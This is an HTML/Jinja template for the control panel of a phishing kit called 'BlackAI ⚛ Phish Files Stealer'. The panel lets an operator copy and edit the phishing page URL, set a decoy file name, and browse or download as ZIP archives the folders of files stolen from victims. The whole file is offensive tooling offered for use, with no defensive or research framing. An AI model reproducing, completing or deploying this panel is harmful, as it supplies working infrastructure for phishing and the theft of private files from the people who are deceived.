<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>BlackAI ⚛ Phish Files Stealer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: 'Segoe UI', sans-serif;
            background-color: #111;
            color: #fff;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 700px;
            margin: 0 auto;
        }
        h1 {
            text-align: center;
            margin-bottom: 30px;
        }
        .folder-card {
            background: #222;
            padding: 12px 20px;
            border-radius: 8px;
            margin-bottom: 8px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .folder-info h3 {
            margin: 0 0 4px 0;
        }
        .folder-info span {
            font-size: 12px;
            color: #999;
        }
        .folder-actions a {
            display: inline-block;
            padding: 8px 8px;
            border-radius: 6px;
            text-decoration: none;
            font-size: 12px;
            font-weight: bold;
            margin-left: 8px;
        }
        .btn-view {
            background: #cc0000;
            color: white;
        }
        .btn-zip {
            background: #cc0000;
            color: white;
        }
        .btn-view:hover { background: #cc0000; }
        .btn-zip:hover { background: #cc0000; }
        .empty {
            text-align: center;
            color: #777;
            margin-top: 60px;
            font-size: 12px;
        }
        .url-section {
            background: #111;
            padding: 8px 12px;
            border-radius: 0;
            margin-bottom: 20px;
            text-align: center;
        }
        .url-section h2 {
            margin: 0 0 6px 0;
            font-size: 13px;
            font-weight: normal;
            color: #ccc;
        }
        .url-row {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        .url-input {
            width: 240px;
            flex: none;
            padding: 4px 8px;
            font-size: 11px;
            border-radius: 3px;
            border: 1px solid #ccc;
            background: #fff;
            color: #000;
        }
        .url-input:read-only {
            background: #fff;
        }
        .btn-copy, .btn-edit-url {
            padding: 4px 10px;
            border: none;
            border-radius: 3px;
            font-size: 11px;
            font-weight: bold;
            color: white;
            background: #cc0000;
            cursor: pointer;
        }
        .btn-copy:hover, .btn-edit-url:hover {
            background: #cc0000;
        }
        .dashboard-header {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-bottom: 10px;
            margin-top: 10px;
        }
        .dashboard-header h2 {
            margin: 0;
            font-size: 25px;
            font-weight: bold;
            color: #fff;
        }
        .btn-refresh {
            width: 25px;
            height: 25px;
            border-radius: 50%;
            background: #cc0000;
            border: none;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 0;
            transition: transform 0.3s ease;
        }
        .btn-refresh:hover {
            background: #a00;
            transform: rotate(180deg);
        }
        .btn-refresh svg {
            width: 20px;
            height: 20px;
            fill: white;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>BlackAI ⚛ Phish Files Stealer</h1>

        <div class="url-section">
            <h2>Phish Files Stealer Page URL</h2>
            <div class="url-row">
                <input type="text" id="phishUrl" class="url-input" value="{{ phish_url }}" readonly>
                <button class="btn-copy" onclick="copyUrl()">Copy URL</button>
                <button class="btn-edit-url" id="editBtn" onclick="toggleEdit()">Edit URL</button>
            </div>
        </div>

        <div class="url-section">
            <h2>Display File Name</h2>
            <div class="url-row">
                <input type="text" id="fileName" class="url-input" style="border: 1px solid #ffffff;" value="{{ file_name }}" placeholder="File Name" readonly>
                <button class="btn-edit-url" id="editFileBtn" onclick="toggleFileEdit()">Edit File Name</button>
            </div>
        </div>

        <div class="dashboard-header">
            <h2>Dashboard</h2>
            <button class="btn-refresh" onclick="location.reload()" title="Refresh page">
                <svg viewBox="0 0 24 24"><path d="M17.65 6.35A7.958 7.958 0 0012 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08A5.99 5.99 0 0112 18c-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg>
            </button>
        </div>

        {% if folders %}
            {% for folder in folders %}
            <div class="folder-card">
                <div class="folder-info">
                    <h3>{{ folder.name }}</h3>
                    <span>{{ folder.file_count }} file(s) &middot; {{ folder.size }}</span>
                </div>
                <div class="folder-actions">
                    <a class="btn-view" href="/access/{{ folder.name }}">View</a>
                    <a class="btn-zip" href="/access/{{ folder.name }}/download-zip">Download ZIP</a>
                </div>
            </div>
            {% endfor %}
        {% else %}
            <p class="empty">No stealed files yet.</p>
        {% endif %}
    </div>

    <script>
        function copyUrl() {
            const input = document.getElementById('phishUrl');
            navigator.clipboard.writeText(input.value).then(() => {
                const btn = document.querySelector('.btn-copy');
                btn.textContent = 'Copied!';
                setTimeout(() => btn.textContent = 'Copy URL', 2000);
            });
        }

        let fileEditing = false;
        function toggleFileEdit() {
            const input = document.getElementById('fileName');
            const btn = document.getElementById('editFileBtn');
            if (!fileEditing) {
                input.removeAttribute('readonly');
                input.focus();
                btn.textContent = 'Save File Name';
                fileEditing = true;
            } else {
                const newName = input.value.trim();
                fetch('/update-file-name', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({file_name: newName})
                }).then(res => {
                    if (res.ok) {
                        input.setAttribute('readonly', true);
                        btn.textContent = 'Edit File Name';
                        fileEditing = false;
                    }
                });
            }
        }

        let editing = false;
        function toggleEdit() {
            const input = document.getElementById('phishUrl');
            const btn = document.getElementById('editBtn');
            if (!editing) {
                input.removeAttribute('readonly');
                input.focus();
                btn.textContent = 'Save URL';
                editing = true;
            } else {
                const newUrl = input.value.trim();
                fetch('/update-phish-url', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({url: newUrl})
                }).then(res => {
                    if (res.ok) {
                        input.setAttribute('readonly', true);
                        btn.textContent = 'Edit URL';
                        editing = false;
                    }
                });
            }
        }
    </script>
</body>
</html>
